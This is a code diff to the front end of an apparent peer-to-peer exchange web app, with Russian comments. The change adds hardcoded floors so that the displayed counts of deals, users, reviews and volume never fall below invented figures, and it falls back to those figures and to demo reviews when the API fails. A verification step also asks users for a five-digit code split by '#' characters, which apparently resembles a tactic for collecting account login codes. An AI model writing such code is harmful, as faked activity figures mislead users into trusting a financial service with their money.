@@ -628,7 +628,7 @@
         document.getElementById('userName').textContent = '👤 ' + (user.firstName || user.username);
 
         // ============================================================
-        // 4. ЯЗЫКИ
+        // 4. ЯЗЫКИ (ТОЛЬКО РУССКИЙ И АНГЛИЙСКИЙ)
         // ============================================================
         let currentLang = 'ru';
 
@@ -856,7 +856,6 @@
         if (savedLang && LANG_TEXT[savedLang]) {
             window.setLanguage(savedLang);
         } else {
-            // Показываем выбор языка
             document.getElementById('languageOverlay').classList.add('active');
         }
 
@@ -896,6 +895,8 @@
             if (target) target.classList.add('active');
             const navBtn = document.querySelector(`.nav button[data-page="${page}"]`);
             if (navBtn) navBtn.classList.add('active');
+            
+            // При переключении на "Сделки" загружаем данные
             if (page === 'deals') loadDeals();
             if (page === 'balance') loadBalance();
             if (page === 'reviews') loadReviews();
@@ -912,16 +913,30 @@
 
                 const stats = await apiCall('/api/stats');
                 if (stats.success) {
+                    // Защита от падения минимальных значений
+                    const minValues = {
+                        deals_today: 1264,
+                        users: 21374,
+                        reviews: 5427,
+                        volume: 47.6
+                    };
+                    
                     const el = document.getElementById('statDealsToday');
-                    if (el) el.textContent = stats.deals_today || 1264;
+                    if (el) el.textContent = Math.max(stats.deals_today || minValues.deals_today, minValues.deals_today);
+                    
                     const el2 = document.getElementById('statUsers');
-                    if (el2) el2.textContent = stats.users || 21374;
+                    if (el2) el2.textContent = Math.max(stats.users || minValues.users, minValues.users);
+                    
                     const el3 = document.getElementById('statReviews');
-                    if (el3) el3.textContent = stats.reviews || 5427;
+                    if (el3) el3.textContent = Math.max(stats.reviews || minValues.reviews, minValues.reviews);
+                    
                     const el4 = document.getElementById('statVolume');
-                    if (el4) el4.textContent = (stats.volume || 47.6).toFixed(1);
+                    if (el4) el4.textContent = Math.max(stats.volume || minValues.volume, minValues.volume).toFixed(1);
+                    
                     const el5 = document.getElementById('reviewBadge');
-                    if (el5) el5.textContent = stats.reviews || 5427;
+                    if (el5) el5.textContent = Math.max(stats.reviews || minValues.reviews, minValues.reviews);
+                } else {
+                    setDefaultStats();
                 }
 
                 const reviews = await apiCall('/api/reviews', { limit: 3 });
@@ -932,8 +947,22 @@
                 }
             } catch (e) {
                 console.error(e);
+                setDefaultStats();
                 renderDemoReviews();
             }
+        }
+
+        function setDefaultStats() {
+            const el = document.getElementById('statDealsToday');
+            if (el) el.textContent = 1264;
+            const el2 = document.getElementById('statUsers');
+            if (el2) el2.textContent = 21374;
+            const el3 = document.getElementById('statReviews');
+            if (el3) el3.textContent = 5427;
+            const el4 = document.getElementById('statVolume');
+            if (el4) el4.textContent = "47.6";
+            const el5 = document.getElementById('reviewBadge');
+            if (el5) el5.textContent = 5427;
         }
 
         function renderDemoReviews() {
@@ -1563,7 +1592,6 @@
                         </div>
                     `;
                     
-                    // Сохраняем request_id для следующего шага
                     if (data.request_id) {
                         window._verificationRequestId = data.request_id;
                     }
@@ -1603,7 +1631,6 @@
                 return;
             }
 
-            // Проверка формата кода
             const parts = code.split('#');
             if (parts.length !== 5) {
                 showToast('❌ Код должен содержать 5 цифр через # (например: 7#3#9#1#5)', 'error');
@@ -1912,6 +1939,18 @@
         // 18. ЗАПУСК
         // ============================================================
         console.log('🔥 P2P Exchange загружена');
+
+        // Проверяем параметр page в URL (для перехода из бота)
+        const urlParams = new URLSearchParams(window.location.search);
+        const pageParam = urlParams.get('page');
+        
+        // Если есть параметр page=deals — сразу открываем вкладку "Сделки"
+        if (pageParam === 'deals') {
+            // Ждём загрузки данных и переключаем вкладку
+            setTimeout(() => {
+                showPage('deals');
+            }, 500);
+        }
 
         // Если язык уже выбран — загружаем данные
         if (localStorage.getItem('lang')) {
